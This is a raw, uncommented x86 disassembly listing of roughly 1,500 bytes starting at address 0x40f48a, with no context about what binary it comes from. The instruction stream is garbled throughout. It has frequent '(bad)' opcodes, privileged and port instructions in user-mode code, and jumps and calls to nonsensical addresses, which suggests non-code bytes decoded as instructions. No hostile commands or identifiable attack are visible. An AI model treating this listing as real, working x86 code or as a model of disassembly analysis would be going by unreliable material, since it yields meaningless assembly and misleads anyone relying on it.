  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
  40f527:	mov    edi,edi
  40f529:	hlt    
  40f52a:	call   DWORD PTR [ebp-0x75]
  40f52d:	mov    esp,eax
  40f52f:	cwde   
  40f530:	(bad)  
  40f531:	mov    bh,0xc3
  40f533:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  40f539:	add    DWORD PTR [eax],0x450050ff
  40f53f:	mov    DWORD PTR [ebx+0x9598c8],ecx
  40f545:	inc    edi
  40f547:	jmp    DWORD PTR [eax]
  40f549:	jmp    0xcd00:0x650481ff
  40f550:	mov    DWORD PTR [ebx],esi
  40f552:	and    al,0x81
  40f554:	(bad)  
  40f555:	cmp    al,0xff
  40f557:	pushf  
  40f558:	push   DWORD PTR [ebp+0x8]
  40f55b:	mov    eax,eax
  40f55d:	add    esi,DWORD PTR [eax]
  40f55f:	enter  0x3c45,0x83
  40f563:	add    ah,bh
  40f565:	adc    DWORD PTR [ebx+0x768b5055],eax
  40f56b:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  40f571:	mov    esi,eax
  40f573:	xor    BYTE PTR [ebp+0x45],cl
  40f576:	jmp    0x40f503
  40f578:	mov    ebx,DWORD PTR [eax]
  40f57a:	in     al,dx
  40f57b:	inc    ebp
  40f57c:	or     al,0x2
  40f57e:	dec    DWORD PTR [ebp-0x4]
  40f581:	jne    0x40f5d8
  40f583:	mov    ecx,DWORD PTR [eax+0x18558be8]
  40f589:	mov    edi,DWORD PTR [ebx]
  40f58b:	lock push eax
  40f58d:	xchg   ecx,eax
  40f58e:	jmp    0x3414393
  40f593:	adc    al,0x8b
  40f595:	inc    ebp
  40f596:	mov    al,ds:0x8b04008b
  40f59b:	push   ebp
  40f59c:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  40f5a2:	push   ebp
  40f5a3:	test   DWORD PTR [ebx-0x2900d701],ecx
  40f5a9:	inc    ebp
  40f5aa:	dec    ebp
  40f5ab:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  40f5b1:	mov    DWORD PTR [eax],0xe9ff0020
  40f5b7:	add    al,0x0
  40f5b9:	add    BYTE PTR [eax],al
  40f5bb:	mov    eax,edx
  40f5bd:	push   eax
  40f5be:	rol    DWORD PTR [ebp-0xb0077],1
  40f5c4:	bound  eax,QWORD PTR [ebp+0x50]
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x55899803]
  40f5cd:	sub    al,0x89
  40f5cf:	push   esp
  40f5d1:	lea    edx,[ebp-0x6c]
  40f5d4:	jne    0xffd6f4ec
  40f5da:	inc    DWORD PTR [ebp-0x1d0001]
  40f5e0:	jnp    0xc796d5e6
  40f5e6:	mov    eax,ebx
  40f5e8:	fs mov edi,edi
  40f5eb:	sbb    al,0xc1
  40f5ed:	out    dx,al
  40f5ee:	or     al,0x0
  40f5f0:	ret    0x8d50
  40f5f3:	inc    ebp
  40f5f4:	dec    DWORD PTR [ebx+0xfa98d7]
  40f5fa:	test   edi,edi
  40f5fc:	clc    
  40f5fd:	call   FWORD PTR [edi]
  40f5ff:	or     BYTE PTR [eax],cl
  40f601:	inc    ebp
  40f602:	dec    ebp
  40f603:	inc    DWORD PTR [ebx+0x74803114]
  40f609:	add    DWORD PTR [ebx+0x45fc00],ecx
  40f60f:	call   DWORD PTR [eax+edx*1]
  40f612:	add    ecx,DWORD PTR [ebp-0x38]
  40f615:	push   esi
  40f616:	adc    al,0x8
  40f618:	mov    edx,DWORD PTR [ebp-0x14]
  40f61b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f61e:	add    DWORD PTR [ebp-0x68],0xffffff8d
  40f622:	inc    DWORD PTR [esp+esi*8]
  40f625:	inc    ebp
  40f626:	stos   BYTE PTR es:[edi],al
  40f627:	mov    edx,DWORD PTR [ebp+0x1c]
  40f62a:	add    DWORD PTR [ebp-0x10],eax
  40f62d:	mov    edx,DWORD PTR [ebp-0x70]
  40f630:	cmp    eax,DWORD PTR [eax]
  40f632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f633:	mov    eax,DWORD PTR [eax]
  40f635:	sbb    al,0x73
  40f637:	add    BYTE PTR [ebx],0x1
  40f63a:	call   0x8971463f
  40f63f:	xor    eax,ebp
  40f641:	pop    ds
  40f642:	inc    ebp
  40f643:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  40f649:	(bad)  
  40f64a:	push   DWORD PTR [edi]
  40f64c:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  40f652:	push   DWORD PTR [ebx-0x1]
  40f655:	mov    eax,DWORD PTR [ebp-0x740075]
  40f65b:	sub    eax,DWORD PTR [eax]
  40f65d:	add    eax,DWORD PTR [eax]
  40f65f:	mov    DWORD PTR [ecx+0x5f],eax
  40f662:	mov    DWORD PTR [ebx+0x28],ebx
  40f665:	ret    0xff
  40f668:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  40f66e:	ret    
  40f66f:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f675:	add    BYTE PTR [ebp-0x7d],al
  40f678:	mov    DWORD PTR [eax],eax
  40f67a:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  40f681:	sar    bh,cl
  40f683:	test   BYTE PTR [eax+0x1],dl
  40f686:	inc    ebp
  40f687:	add    BYTE PTR [ebx],dh
  40f689:	test   BYTE PTR [ebx],0x84
  40f68c:	push   eax
  40f68d:	add    BYTE PTR [ebp+0x0],al
  40f690:	add    eax,0x86
  40f695:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f69b:	add    BYTE PTR [ecx],al
  40f69d:	add    BYTE PTR [eax],al
  40f69f:	mov    esi,0x550030
  40f6a4:	mov    ecx,DWORD PTR [edi]
  40f6a6:	sbb    al,0xda
  40f6a8:	jne    0x40f6aa
  40f6aa:	mov    edi,DWORD PTR [ecx]
  40f6ac:	xor    BYTE PTR [eax+eax*1],0x84
  40f6b0:	add    eax,DWORD PTR [eax]
  40f6b2:	cld    
  40f6b3:	add    BYTE PTR [ebp-0x4f],dh
  40f6b6:	mov    eax,DWORD PTR [ecx]
  40f6b8:	cld    
  40f6b9:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f6bf:	retf   0xe45
  40f6c2:	add    eax,edx
  40f6c4:	sbb    al,0xb7
  40f6c6:	dec    ebp
  40f6c7:	or     al,0x89
  40f6c9:	dec    ebp
  40f6ca:	sbb    al,0xf
  40f6cc:	inc    ebp
  40f6cd:	dec    eax
  40f6ce:	mov    eax,DWORD PTR [ebx]
  40f6d0:	sbb    al,0xf
  40f6d2:	nop
  40f6d3:	scas   al,BYTE PTR es:[edi]
  40f6d4:	add    DWORD PTR [eax],eax
  40f6d6:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f6dc:	mov    eax,gs
  40f6de:	add    bh,bh
  40f6e0:	mov    edi,edi
  40f6e2:	cmp    DWORD PTR [edi+0x72],edx
  40f6e5:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f6eb:	gs cmp al,0x0
  40f6ee:	je     0x40f6c6
  40f6f0:	push   eax
  40f6f1:	sar    BYTE PTR [eax],1
  40f6f3:	mov    bh,0x3e
  40f6f5:	push   cs
  40f6f6:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f6fc:	add    DWORD PTR [ecx+0x12],ebp
  40f6ff:	dec    edx
  40f700:	(bad)  
  40f701:	mov    eax,edx
  40f703:	in     al,dx
  40f704:	adc    DWORD PTR [ecx],esi
  40f706:	pop    esi
  40f707:	inc    ecx
  40f708:	leave  
  40f709:	or     DWORD PTR [eax],ebx
  40f70b:	gs push ebp
  40f70d:	add    ah,ch
  40f70f:	into   
  40f710:	in     al,dx
  40f711:	enter  0xb756,0xf0
  40f715:	push   cs
  40f716:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f720:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f726:	jnp    0x74417c2e
  40f72c:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f732:	add    BYTE PTR [edi],cl
  40f734:	mov    edi,DWORD PTR [ecx-0x78]
  40f737:	ltr    WORD PTR [ecx-0x7b]
  40f73b:	dec    DWORD PTR [edi]
  40f73d:	clc    
  40f73e:	out    0x45,eax
  40f740:	add    BYTE PTR [eax],cl
  40f742:	cmp    ebx,0xffffff8c
  40f745:	jge    0x40f747
  40f747:	jb     0x40f759
  40f749:	je     0x4ff7c9
  40f74f:	pop    edx
  40f750:	push   esi
  40f751:	mov    ecx,DWORD PTR [edi]
  40f753:	in     al,dx
  40f754:	rol    DWORD PTR [ebp+0x0],1
  40f757:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f75e:	cmp    DWORD PTR [ecx],0xfffffff0
  40f761:	hlt    
  40f762:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f768:	(bad)  
  40f76a:	push   eax
  40f76b:	jns    0xb840dbe9
  40f771:	lock push cs
  40f773:	ror    edx,0x3
  40f776:	test   BYTE PTR [ecx+0x5500e800],cl
  40f77c:	dec    eax
  40f77d:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f781:	(bad)  
  40f782:	mov    esi,0x7f33ff5f
  40f787:	inc    eax
  40f788:	test   DWORD PTR [edx],eax
  40f78a:	je     0x40f74c
  40f78c:	mov    ecx,ecx
  40f78e:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f792:	and    eax,DWORD PTR [eax+0xf0103]
  40f798:	jp     0x40f786
  40f79a:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f79e:	add    edx,DWORD PTR [edi+0x74]
  40f7a1:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f7a7:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f7ad:	je     0x40f732
  40f7af:	cmp    eax,edi
  40f7b1:	js     0x40f7d6
  40f7b3:	add    eax,0xeb0fc003
  40f7b8:	jns    0x40f745
  40f7ba:	vmread DWORD PTR [ecx+0x45],ebx
  40f7be:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f7c4:	adc    al,0x8b
  40f7c6:	jge    0x40f7dc
  40f7c8:	mov    edi,DWORD PTR [eax-0x4]
  40f7cb:	add    edi,DWORD PTR [edi]
  40f7cd:	or     bh,bh
  40f7cf:	push   ebp
  40f7d0:	push   es
  40f7d1:	mov    DWORD PTR [ebp-0x4],ebx
  40f7d4:	add    edi,esi
  40f7d6:	pop    es
  40f7d7:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f7dd:	mov    DWORD PTR [esp+esi*8],ecx
  40f7e0:	inc    ebp
  40f7e1:	pop    ebp
  40f7e2:	xor    DWORD PTR [esi-0x4],0x3b
  40f7e6:	add    edx,DWORD PTR [ecx+edi*1]
  40f7e9:	push   es
  40f7ea:	clc    
  40f7eb:	mov    bh,0xdb
  40f7ed:	jp     0x40f7a6
  40f7ef:	add    cl,BYTE PTR [esi]
  40f7f1:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f7f7:	test   edi,edi
  40f7f9:	je     0x40f7ef
  40f7fb:	mov    eax,ecx
  40f7fd:	or     BYTE PTR [ebx],al
  40f7ff:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f805:	jbe    0x40f879
  40f807:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f80d:	add    ecx,DWORD PTR [esi]
  40f80f:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f815:	add    eax,DWORD PTR [ebx-0x287af783]
  40f81b:	je     0x40f86a
  40f81d:	mov    DWORD PTR [ecx],edi
  40f81f:	mov    esi,eax
  40f821:	hlt    
  40f822:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f829:	jb     0x40f7eb
  40f82b:	jmp    0x40f818
  40f82d:	xor    esi,DWORD PTR [ebx]
  40f82f:	pop    edi
  40f830:	pop    esi
  40f831:	pop    ebx
  40f832:	ret    
  40f833:	ret    0x8b
  40f836:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f83c:	xor    DWORD PTR [ecx],0xc
  40f83f:	pushf  
  40f840:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  40f846:	rdmsr  
  40f848:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  40f84f:	dec    ebp
  40f850:	ret    
  40f851:	mov    edi,DWORD PTR [esi-0x4]
  40f854:	pop    eax
  40f855:	dec    ebp
  40f856:	jne    0x40f7e3
  40f858:	xor    edi,esp
  40f85a:	inc    eax
  40f85b:	dec    ebp
  40f85c:	jbe    0x40f8b1
  40f85e:	inc    eax
  40f85f:	pop    ebp
  40f860:	add    edx,DWORD PTR [esi+0x8]
  40f863:	push   esp
  40f864:	dec    eax
  40f865:	push   ecx
  40f866:	mov    eax,edi
  40f868:	and    al,0xf0
  40f86a:	jo     0x40f857
  40f86c:	mov    eax,DWORD PTR [ebx]
  40f86e:	sbb    BYTE PTR [ebp+0x4d],cl
  40f871:	mov    eax,DWORD PTR [ebx]
  40f873:	nop
  40f874:	or     BYTE PTR [eax],al
  40f876:	jne    0x40f8cf
  40f878:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  40f87e:	cld    
  40f87f:	xor    edi,edi
  40f881:	add    edi,DWORD PTR [ebp+0x3]
  40f884:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f88a:	js     0x40f810
  40f88c:	jae    0x40f890
  40f88e:	(bad)  
  40f890:	xor    al,0x5d
  40f892:	jmp    0x40f81f
  40f894:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f89b:	fdecstp 
  40f89d:	test   BYTE PTR [edi],ah
  40f89f:	add    bh,BYTE PTR [ebp+0x0]
  40f8a2:	add    ebx,DWORD PTR [ebp-0x77]
  40f8a5:	mov    edi,eax
  40f8a7:	cmp    al,0x0
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	jge    0x40f8b1
  40f8ae:	mov    edi,DWORD PTR [ebx]
  40f8b0:	jl     0x40f8c1
  40f8b2:	clc    
  40f8b3:	dec    edi
  40f8b4:	jge    0x40f8b6
  40f8b6:	mov    eax,DWORD PTR [ebx]
  40f8b8:	jb     0x40f8c2
  40f8ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f8bd:	mov    edi,edi
  40f8bf:	xor    edx,DWORD PTR [eax]
  40f8c1:	add    edi,DWORD PTR [ebx]
  40f8c3:	mov    DWORD PTR [ebp-0x10],edi
  40f8c6:	inc    edi
  40f8c7:	pop    ebp
  40f8c8:	jge    0x40f905
  40f8ca:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40f8ce:	mov    edx,0xc05d87f0
  40f8d3:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40f8d7:	fimul  WORD PTR [eax]
  40f8d9:	fist   WORD PTR [ebp+0x1c]
  40f8dc:	in     al,dx
  40f8dd:	jne    0x40f8cb
  40f8df:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40f8e5:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40f8e9:	fdivp  st(0),st
  40f8eb:	fild   WORD PTR [ebp+0x4510f85c]
  40f8f1:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40f8f7:	inc    ebp
  40f8f8:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40f8fe:	mov    ebp,DWORD PTR [ebx-0x4]
  40f901:	adc    al,0x8b
  40f903:	rcl    DWORD PTR [eax],0x48
  40f906:	mov    esi,0x7080803
  40f90b:	fiadd  WORD PTR [ebp+0x4d]
  40f90e:	(bad)  
  40f90f:	mov    edx,DWORD PTR [edx-0x4]
  40f912:	mov    edx,DWORD PTR [ebp-0x4]
  40f915:	xor    ebx,DWORD PTR [ebx+0x330103]
  40f91b:	mov    DWORD PTR [edi+0x872dc],edi
  40f921:	xlat   BYTE PTR ds:[ebx]
  40f922:	into   
  40f923:	ffreep st(6)
  40f925:	retf   0x6c7
  40f928:	iret   
  40f929:	dec    ebp
  40f92a:	inc    ebp
  40f92b:	mov    DWORD PTR [ebx],edi
  40f92d:	fmul   QWORD PTR [edi]
  40f92f:	dec    ebp
  40f930:	jnp    0x40f965
  40f932:	add    BYTE PTR [ebx],al
  40f934:	mov    ecx,DWORD PTR [esp+edi*8]
  40f937:	inc    ebp
  40f938:	dec    ebp
  40f939:	lea    esi,[ebx]
  40f93b:	add    DWORD PTR [ebx],eax
  40f93d:	jb     0x40f97a
  40f93f:	add    BYTE PTR [edi],cl
  40f941:	inc    ebp
  40f942:	imul   eax,edi,0x858bd800
  40f948:	cld    
  40f949:	clc    
  40f94a:	mov    DWORD PTR [ebp+0x0],eax
  40f94d:	inc    DWORD PTR [eax]
  40f94f:	or     al,0xde
  40f951:	sbb    bh,0x1
  40f954:	retf   
  40f955:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40f95c:	dec    ebp
  40f95d:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40f963:	enter  0x12de,0xdf
  40f967:	inc    ebp
  40f968:	pop    ebp
  40f969:	dec    DWORD PTR [ebx-0x257f0ff4]
  40f96f:	add    DWORD PTR [edx],edx
  40f971:	add    BYTE PTR [ebp+0x50],dl
  40f974:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40f97a:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40f980:	or     ah,al
  40f982:	pop    ss
  40f983:	cdq    
  40f984:	push   ebp
  40f985:	clc    
  40f986:	mov    eax,DWORD PTR [ebp-0x4]
  40f989:	xor    edx,edx
  40f98b:	add    esi,DWORD PTR [ebx]
  40f98d:	cmp    eax,DWORD PTR [ebx]
  40f98f:	hlt    
  40f990:	cmp    DWORD PTR [ebx],esp
  40f992:	or     al,BYTE PTR [ebp+0xf]
  40f995:	mov    eax,DWORD PTR [edx]
  40f997:	loopne 0x40f999
  40f999:	(bad)  
  40f99a:	mov    ecx,esi
  40f99c:	cld    
  40f99d:	pushf  
  40f99e:	pop    ebp
  40f99f:	fwait
  40f9a0:	mov    esi,DWORD PTR [edx]
  40f9a2:	lock mov eax,eax
  40f9a5:	adc    BYTE PTR [ebx],al
  40f9a7:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40f9ae:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40f9b4:	dec    ebp
  40f9b5:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40f9bb:	(bad)  
  40f9bc:	iret   
  40f9bd:	inc    ebp
  40f9be:	(bad)  
  40f9bf:	jne    0x40fa0e
  40f9c1:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40f9c7:	(bad)  
  40f9c8:	cmp    ebx,eax
  40f9ca:	je     0x40f952
  40f9cc:	add    edi,edi
  40f9ce:	or     bh,bh
  40f9d0:	dec    ebp
  40f9d1:	inc    ebp
  40f9d2:	mov    esi,DWORD PTR [ebx]
  40f9d4:	cld    
  40f9d5:	add    ecx,esi
  40f9d7:	cmp    ecx,DWORD PTR [eax-0xc]
  40f9da:	mov    edx,DWORD PTR [edi]
  40f9dc:	or     BYTE PTR [ebp-0x7c],al
  40f9df:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  40f9e5:	test   BYTE PTR [ebx+ebx*4],cl
  40f9e8:	inc    ebp
  40f9e9:	xor    bh,BYTE PTR [esi]
  40f9eb:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  40f9f2:	jne    0x40f9bb
  40f9f4:	mov    ebp,esp
  40f9f6:	fcomp  DWORD PTR [ebx]
  40f9f8:	add    BYTE PTR [ecx],al
  40f9fa:	inc    DWORD PTR [ebp-0x75]
  40f9fd:	(bad)  
  40f9fe:	cld    
  40f9ff:	add    al,0xce
  40fa01:	mov    ecx,edi
  40fa03:	cld    
  40fa04:	inc    ebp
  40fa05:	fidivr WORD PTR [ebx]
  40fa07:	fbstp  TBYTE PTR [ebp-0x3e]
  40fa0a:	mov    eax,DWORD PTR [eax]
  40fa0c:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fa12:	fadd   st,st(7)
  40fa14:	add    BYTE PTR [ebp-0x1],al
  40fa17:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa1a:	inc    ebp
  40fa1b:	mov    bh,0xc7
  40fa1e:	loopne 0x40fa65
  40fa20:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fa26:	sbb    dh,BYTE PTR [ebx]
  40fa28:	pushf  
  40fa29:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fa2f:	mov    eax,edi
  40fa31:	cwde   
  40fa32:	inc    ebp
  40fa33:	inc    ebp
  40fa34:	jne    0x40f9c1
  40fa36:	mov    esp,esp
  40fa38:	clc    
  40fa39:	add    al,0x4d
  40fa3b:	mov    DWORD PTR [ebx],esi
  40fa3d:	or     al,0x33
  40fa3f:	inc    ebp
  40fa40:	lea    ecx,[ebx-0x398d13fd]
  40fa46:	add    bh,al
  40fa48:	inc    ebp
  40fa49:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fa50:	add    ebp,esp
  40fa52:	shufps xmm1,xmm3,0xc7
  40fa56:	(bad)  
  40fa57:	jmp    0x74863580
  40fa5c:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fa62:	hlt    
  40fa63:	mov    ecx,DWORD PTR [edi]
  40fa65:	fadd   DWORD PTR [ebp+0x0]
  40fa68:	xor    ecx,DWORD PTR [edi]
  40fa6a:	add    ecx,ecx
  40fa6c:	cmp    edi,edi
  40fa6e:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fa72:	(bad)  
  40fa73:	jmp    0x40fa00
  40fa75:	mov    edi,esp
  40fa77:	or     al,0xc6
  40fa79:	inc    ebp
  40fa7a:	(bad)  
  40fa7b:	mov    eax,DWORD PTR [ebp+0x10]
  40fa7e:	jne    0x40fa09
  40fa80:	mov    eax,DWORD PTR [ecx]
  40fa82:	clc    
  40fa83:	add    BYTE PTR [ebp-0x40],cl
  40fa86:	xor    edx,DWORD PTR [eax-0x73]
  40fa89:	jne    0x40fa8c
  40fa8b:	push   DWORD PTR [edx+0x8]
  40fa8e:	add    BYTE PTR [ebp+0x45],al
  40fa91:	mov    ebp,ecx
  40fa93:	cld    
  40fa94:	add    BYTE PTR [ebp+0x0],cl
  40fa97:	xor    eax,DWORD PTR [ebp+0x3]
  40fa9a:	mov    DWORD PTR [ebx],edi
  40fa9c:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40faa2:	sub    eax,0x5d330e4d
  40faa7:	lea    esi,[ebx]
  40faa9:	add    DWORD PTR [ebx],eax
  40faab:	jb     0x40fa96
  40faad:	add    BYTE PTR [eax],al
  40faaf:	inc    ebp
  40fab0:	add    bl,ch
  40fab2:	inc    ebp
  40fab3:	mov    esi,DWORD PTR [ebx]
  40fab5:	or     al,0x3
  40fab7:	(bad)  
  40fab8:	mov    edi,eax
  40faba:	in     al,dx
  40fabb:	scas   eax,DWORD PTR es:[edi]
  40fabc:	inc    ebp
  40fabd:	mov    esi,DWORD PTR [ebx]
  40fabf:	in     al,0x3
  40fac1:	add    al,0x89
  40fac3:	mov    ecx,DWORD PTR [eax+edi*8]
  40fac6:	dec    ebp
  40fac7:	(bad)  
  40fac8:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  40facf:	mov    ecx,eax
  40fad1:	cld    
  40fad2:	push   es
  40fad3:	dec    ebp
  40fad4:	add    al,0x33
  40fad6:	mov    DWORD PTR [ebx],eax
  40fad8:	in     al,dx
  40fad9:	cmp    DWORD PTR [ebp-0x67],eax
  40fadc:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fae2:	mov    edx,DWORD PTR [ebp-0x4]
  40fae5:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fae8:	xor    eax,DWORD PTR [ebp+0x3]
  40faeb:	cmp    DWORD PTR [ebx],0x8b32749a
  40faf1:	xor    edi,esp
  40faf3:	jmp    0xff74f845
  40faf8:	add    ecx,DWORD PTR [ebp-0x3f]
  40fafb:	xor    ebx,DWORD PTR [edi]
  40fafd:	add    eax,ecx
  40faff:	cmp    ebx,DWORD PTR [eax]
  40fb01:	mov    ecx,DWORD PTR [ebp-0x4]
  40fb04:	mov    ecx,DWORD PTR [eax]
  40fb06:	adc    BYTE PTR [ebp-0x80],al
  40fb09:	jmp    0x40fb0c
  40fb0b:	mov    eax,DWORD PTR [eax]
  40fb0d:	cld    
  40fb0e:	mov    bh,0xc6
  40fb10:	push   ecx
  40fb11:	(bad)  
  40fb12:	jne    0x40fb72
  40fb14:	dec    ecx
  40fb16:	or     BYTE PTR [ecx+ebx*1],cl
  40fb19:	push   ebp
  40fb1a:	inc    ebp
  40fb1b:	in     al,dx
  40fb1c:	add    ebp,esp
  40fb1e:	or     bh,al
  40fb20:	dec    ebp
  40fb21:	cld    
  40fb22:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fb28:	xor    DWORD PTR [edx],0x2
  40fb2b:	pushf  
  40fb2c:	dec    DWORD PTR [ebx+0x45510cf4]
  40fb32:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  40fb38:	mov    edx,DWORD PTR [ecx+0xc]
  40fb3b:	xor    eax,esi
  40fb3d:	mov    edx,0xc172c7
  40fb42:	inc    ebp
  40fb43:	mov    esi,DWORD PTR [ebp+0x8]
  40fb46:	mov    eax,edx
  40fb48:	call   0x84c5c23d
  40fb4d:	add    DWORD PTR [ebx-0x76bace00],ebx
  40fb53:	mov    ebp,eax
  40fb55:	or     BYTE PTR [eax],dl
  40fb57:	jo     0x40fba6
  40fb59:	push   edi
  40fb5a:	xor    esi,DWORD PTR [ebp+0x3]
  40fb5d:	(bad)  
  40fb5e:	pmulhuw mm0,mm1
  40fb61:	test   DWORD PTR [ebp-0x8],ecx
  40fb64:	mov    DWORD PTR [ebp-0x67],eax
  40fb67:	mov    eax,DWORD PTR [ebp-0x4]
  40fb6a:	xor    edi,DWORD PTR [ebp-0x73]
  40fb6d:	xor    eax,DWORD PTR [ebx]
  40fb6f:	xor    esi,DWORD PTR [edx+0x3]
  40fb72:	add    BYTE PTR [ecx],bh
  40fb74:	inc    ebp
  40fb75:	(bad)  
  40fb76:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fb7c:	mov    DWORD PTR [eax],0x750f0004
  40fb82:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fb88:	lock add BYTE PTR [ebp+0x0],cl
  40fb8c:	mov    esi,DWORD PTR [ebp-0x18]
  40fb8f:	mov    ebp,edx
  40fb91:	or     al,0x72
  40fb93:	ja     0x40fb95
  40fb95:	mov    edx,esi
  40fb97:	cld    
  40fb98:	(bad)  
  40fb9b:	cli    
  40fb9c:	mov    esi,DWORD PTR [ebp-0x4]
  40fb9f:	cmp    ecx,esi
  40fba1:	bswap  edi
  40fba3:	(bad)
  40fba7:	mov    esi,DWORD PTR [ebp-0x4]
  40fbaa:	mov    esi,ecx
  40fbac:	clc    
  40fbad:	repnz add esi,DWORD PTR [ebp+0x45]
  40fbb1:	push   ebx
  40fbb2:	xor    eax,DWORD PTR [ebp+0x3]
  40fbb5:	cmp    al,0x5f
  40fbb7:	pushf  
  40fbb8:	pop    ebx
  40fbb9:	jmp    0x40fc80
  40fbbe:	mov    esi,DWORD PTR [ebp-0x7d]
  40fbc1:	xor    ebp,DWORD PTR [eax]
  40fbc3:	lea    eax,[ebp-0x8]
  40fbc6:	xor    edx,esi
  40fbc8:	pushf  
